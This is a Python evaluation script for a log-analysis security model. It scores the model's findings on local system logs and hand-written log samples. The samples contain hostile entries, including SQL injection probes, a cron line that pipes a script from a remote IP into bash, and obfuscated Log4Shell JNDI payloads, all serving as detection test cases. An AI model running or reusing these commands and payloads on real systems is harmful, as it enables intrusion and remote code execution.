#!/usr/bin/env python3
"""Real-world sanity test: local /var/log chunks (mostly benign) + hand-written out-of-distribution cases.

python realtest.py --model runs/r1/final --out runs/r1/real.json       (HF)
python realtest.py --server http://127.0.0.1:8190 --out gguf_real.json  (llama-server)
Local log chunks are only used for testing, never for training.
"""
import argparse, json, re, subprocess

ap = argparse.ArgumentParser()
ap.add_argument("--model"); ap.add_argument("--server"); ap.add_argument("--out", required=True)
a = ap.parse_args()
IP_RE = re.compile(r"(?<![\d.:])(?:25[0-5]|2[0-4]\d|1?\d?\d)(?:\.(?:25[0-5]|2[0-4]\d|1?\d?\d)){3}(?![\d.])")


def tail(path, n, grep=None):
    try:
        lines = open(path, errors="replace").read().splitlines()
    except Exception:
        return ""
    if grep:
        idx = [i for i, l in enumerate(lines) if grep in l]
        if not idx:
            return ""
        i = idx[-1]
        return "\n".join(lines[max(0, i - n // 2): i + n // 2])
    return "\n".join(lines[-n:])


cases = []
# ---- local logs (expected: no high/critical finding; QUIC/multicast blocks must not be called a scan)
for name, path, n, grep in [("local_auth_tail", "/var/log/auth.log", 40, None), ("local_auth_failure", "/var/log/auth.log", 24, "maximum authentication"),
                            ("local_ufw", "/var/log/ufw.log", 27, None), ("local_syslog", "/var/log/syslog", 40, None),
                            ("local_dmesg_ufw", "/var/log/dmesg", 30, None), ("local_dmesg_boot", "/var/log/dmesg", 30, "Linux version")]:
    txt = tail(path, n, grep)
    if txt:
        cases.append({"name": name, "logs": txt, "expect": [], "forbid": ["port_scan", "compromised_account", "ssh_brute_force"]})

# ---- hand-written OOD cases (formats/phrasings the generator never produces)
cases += [
    {"name": "ood_nginx_custom_format", "expect": ["vulnerability_scanner", "sensitive_file_probe"], "forbid": [],
     "logs": """203.0.113.77 [12/Mar/2026:04:11:02 +0100] host=api.example.net "GET /.env HTTP/1.1" 404 153 rt=0.000 uct="-" ua="sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.77 [12/Mar/2026:04:11:02 +0100] host=api.example.net "GET /.git/config HTTP/1.1" 404 153 rt=0.000 uct="-" ua="sqlmap/1.7.2#stable (https://sqlmap.org)"
198.51.100.4 [12/Mar/2026:04:11:03 +0100] host=api.example.net "GET /api/v1/status HTTP/1.1" 200 54 rt=0.012 uct="0.001" ua="Mozilla/5.0 (X11; Linux x86_64)"
203.0.113.77 [12/Mar/2026:04:11:03 +0100] host=api.example.net "GET /api/v1/items?id=1%27%20AND%201%3D1--%20 HTTP/1.1" 500 612 rt=0.044 uct="0.001" ua="sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.77 [12/Mar/2026:04:11:04 +0100] host=api.example.net "GET /api/v1/items?id=1%27%20UNION%20SELECT%20NULL--%20 HTTP/1.1" 500 612 rt=0.051 uct="0.001" ua="sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.77 [12/Mar/2026:04:11:05 +0100] host=api.example.net "GET /backup.zip HTTP/1.1" 404 153 rt=0.000 uct="-" ua="sqlmap/1.7.2#stable (https://sqlmap.org)"
198.51.100.4 [12/Mar/2026:04:11:09 +0100] host=api.example.net "GET /api/v1/status HTTP/1.1" 200 54 rt=0.010 uct="0.001" ua="Mozilla/5.0 (X11; Linux x86_64)"
203.0.113.77 [12/Mar/2026:04:11:10 +0100] host=api.example.net "GET /wp-config.php.bak HTTP/1.1" 404 153 rt=0.000 uct="-" ua="sqlmap/1.7.2#stable (https://sqlmap.org)\""""},
    {"name": "ood_ssh_none_publickey", "expect": ["ssh_brute_force"], "forbid": ["compromised_account"],
     "logs": """2026-03-02T03:14:07.112233+00:00 bastion sshd[5512]: Invalid user oracle from 192.0.2.66 port 50122
2026-03-02T03:14:07.401882+00:00 bastion sshd[5512]: Failed none for invalid user oracle from 192.0.2.66 port 50122 ssh2
2026-03-02T03:14:09.882101+00:00 bastion sshd[5512]: Failed password for invalid user oracle from 192.0.2.66 port 50122 ssh2
2026-03-02T03:14:12.002931+00:00 bastion sshd[5519]: Failed password for root from 192.0.2.66 port 50140 ssh2
2026-03-02T03:14:15.310772+00:00 bastion sshd[5519]: Failed password for root from 192.0.2.66 port 50140 ssh2
2026-03-02T03:14:18.947120+00:00 bastion sshd[5519]: Failed password for root from 192.0.2.66 port 50140 ssh2
2026-03-02T03:14:21.200019+00:00 bastion sshd[5519]: Failed password for root from 192.0.2.66 port 50140 ssh2
2026-03-02T03:14:23.551003+00:00 bastion sshd[5519]: error: maximum authentication attempts exceeded for root from 192.0.2.66 port 50140 ssh2 [preauth]
2026-03-02T03:15:01.003311+00:00 bastion CRON[5601]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
2026-03-02T03:15:01.009812+00:00 bastion CRON[5601]: pam_unix(cron:session): session closed for user root
2026-03-02T03:16:44.700121+00:00 bastion sshd[5650]: Accepted publickey for deploy from 10.8.0.6 port 41022 ssh2: ED25519 SHA256:Zm9vYmFyYmF6cXV4cXV1eHh5enp5MTIzNDU2Nzg5MA"""},
    {"name": "ood_compromise_journal", "expect": ["compromised_account"], "forbid": [],
     "logs": """Mar 05 02:01:11 db01 sshd[811]: Failed password for postgres from 45.155.205.233 port 33018 ssh2
Mar 05 02:01:14 db01 sshd[811]: Failed password for postgres from 45.155.205.233 port 33018 ssh2
Mar 05 02:01:18 db01 sshd[811]: Failed password for postgres from 45.155.205.233 port 33018 ssh2
Mar 05 02:01:25 db01 sshd[815]: Failed password for postgres from 45.155.205.233 port 33102 ssh2
Mar 05 02:01:29 db01 sshd[815]: Failed password for postgres from 45.155.205.233 port 33102 ssh2
Mar 05 02:01:33 db01 sshd[815]: Failed password for postgres from 45.155.205.233 port 33102 ssh2
Mar 05 02:01:40 db01 sshd[820]: Accepted password for postgres from 45.155.205.233 port 33190 ssh2
Mar 05 02:01:40 db01 sshd[820]: pam_unix(sshd:session): session opened for user postgres(uid=113) by postgres(uid=0)
Mar 05 02:01:52 db01 sudo: postgres : user NOT in sudoers ; TTY=pts/0 ; PWD=/var/lib/postgresql ; USER=root ; COMMAND=/bin/bash
Mar 05 02:02:30 db01 CRON[840]: (postgres) CMD (curl -s http://45.155.205.233/k.sh | bash)"""},
    {"name": "ood_dmesg_T_oom_segv", "expect": ["oom_kill", "segfault"], "forbid": [],
     "logs": """[Tue Mar 10 14:02:11 2026] docker0: port 2(veth4c1d2e3) entered forwarding state
[Tue Mar 10 14:05:40 2026] java invoked oom-killer: gfp_mask=0x140cca(GFP_HIGHUSER_MOVABLE|__GFP_COMP), order=0, oom_score_adj=0
[Tue Mar 10 14:05:40 2026] Mem-Info:
[Tue Mar 10 14:05:40 2026] oom-kill:constraint=CONSTRAINT_NONE,nodemask=(null),cpuset=/,mems_allowed=0,global_oom,task_memcg=/system.slice/es.service,task=java,pid=20311,uid=112
[Tue Mar 10 14:05:40 2026] Out of memory: Killed process 20311 (java) total-vm:12450032kB, anon-rss:7340032kB, file-rss:0kB, shmem-rss:0kB, UID:112 pgtables:15104kB oom_score_adj:0
[Tue Mar 10 14:07:02 2026] python3[22841]: segfault at 0 ip 00007f1c2a3b4c10 sp 00007ffd5e1a2b30 error 4 in libc.so.6[7f1c2a28d000+195000] likely on CPU 3 (core 3, socket 0)
[Tue Mar 10 14:07:02 2026] Code: 48 8b 07 48 85 c0 74 09 c3 0f 1f 80 00 00 00 00 31 c0 c3
[Tue Mar 10 14:09:12 2026] EXT4-fs (sda1): mounted filesystem with ordered data mode. Quota mode: none."""},
    {"name": "ood_apache_log4shell_header", "expect": ["log4shell"], "forbid": [],
     "logs": """10.1.1.20 - - [21/Feb/2026:10:00:01 +0000] "GET /health HTTP/1.1" 200 2 "-" "kube-probe/1.29"
185.220.101.42 - - [21/Feb/2026:10:00:07 +0000] "GET /?x=${jndi:ldap://185.220.101.42:1389/Basic/Command/Base64/d2dldCBodHRwOi8vMS4yLjMuNC94} HTTP/1.1" 200 4120 "${jndi:ldap://185.220.101.42:1389/a}" "${jndi:ldap://185.220.101.42:1389/a}"
185.220.101.42 - - [21/Feb/2026:10:00:08 +0000] "POST /api/login HTTP/1.1" 400 88 "-" "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://185.220.101.42/o}"
10.1.1.20 - - [21/Feb/2026:10:00:11 +0000] "GET /health HTTP/1.1" 200 2 "-" "kube-probe/1.29\""""},
    {"name": "ood_benign_busy_web", "expect": [], "forbid": ["sql_injection", "http_flood", "vulnerability_scanner", "path_traversal"],
     "logs": "\n".join(f'192.0.2.{10 + i % 7} - - [01/Apr/2026:09:{i // 6:02d}:{(i * 7) % 60:02d} +0000] "GET {p} HTTP/2.0" {st} {1000 + i * 37} "https://shop.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0"'
                       for i, (p, st) in enumerate([("/", 200), ("/search?q=select+chair", 200), ("/products/union-jack-flag", 200), ("/static/app.js", 200), ("/cart", 200),
                                                    ("/api/cart/add", 201), ("/checkout", 302), ("/static/app.css", 304), ("/favicon.ico", 404), ("/blog/drop-shipping-guide", 200),
                                                    ("/search?q=cat+%26+dog", 200), ("/account/orders", 200), ("/api/orders/551", 200), ("/robots.txt", 200)]))},
    {"name": "ood_question_fr", "expect": None, "forbid": [], "question": "Quels utilisateurs ont réussi à se connecter en SSH, et depuis quelle IP ?",
     "logs": """Apr  2 08:01:13 web01 sshd[1201]: Accepted publickey for marc from 10.0.0.12 port 51234 ssh2: RSA SHA256:abc
Apr  2 08:03:55 web01 sshd[1250]: Failed password for invalid user test from 141.98.11.4 port 4122 ssh2
Apr  2 09:17:40 web01 sshd[1388]: Accepted password for julie from 10.0.0.31 port 60111 ssh2"""},
]


def run(msgs):
    if a.server:
        import urllib.request
        body = json.dumps({"messages": msgs, "temperature": 0, "max_tokens": 1600}).encode()
        req = urllib.request.Request(a.server + "/v1/chat/completions", body, {"Content-Type": "application/json"})
        return json.load(urllib.request.urlopen(req, timeout=600))["choices"][0]["message"]["content"].strip()
    import torch
    from transformers import AutoTokenizer, AutoModelForCausalLM
    global _m, _t
    if "_m" not in globals():
        _t = AutoTokenizer.from_pretrained(a.model)
        _m = AutoModelForCausalLM.from_pretrained(a.model, dtype=torch.bfloat16).cuda().eval()
    p = _t.apply_chat_template(msgs, tokenize=False, add_generation_prompt=True, enable_thinking=False)
    enc = _t(p, return_tensors="pt", add_special_tokens=False).to("cuda")
    with torch.no_grad():
        g = _m.generate(**enc, max_new_tokens=1600, do_sample=False)
    return _t.decode(g[0][enc["input_ids"].shape[1]:], skip_special_tokens=True).strip()


results, score = [], {"pass": 0, "fail": 0}
for c in cases:
    q = c.get("question", "Analyze these logs and report any security issues.")
    out = run([{"role": "user", "content": f"{q}\n\n{c['logs']}"}])
    rec = {"name": c["name"], "output": out}
    if c["expect"] is not None:
        try:
            j = json.loads(out); cats = [f.get("category") for f in j.get("findings", [])]
            hall = sorted(set(IP_RE.findall(out)) - set(IP_RE.findall(c["logs"])))
            ev_ok = all(f.get("evidence", "") in c["logs"] for f in j.get("findings", []))
            ok = all(e in cats for e in c["expect"]) and not any(x in cats for x in c["forbid"]) and not hall and ev_ok
            if c["name"].startswith("local_"):
                ok = ok and j.get("risk_level") in ("none", "low", "medium")
            rec.update(categories=cats, risk=j.get("risk_level"), hallucinated_ips=hall, evidence_verbatim=ev_ok, passed=ok)
        except Exception as e:
            rec.update(passed=False, error=str(e))
        score["pass" if rec["passed"] else "fail"] += 1
    results.append(rec)
    print(c["name"], "->", rec.get("categories"), rec.get("risk"), "PASS" if rec.get("passed") else ("FAIL" if "passed" in rec else ""), flush=True)
json.dump({"score": score, "results": results}, open(a.out, "w"), ensure_ascii=False, indent=1)
print(score)
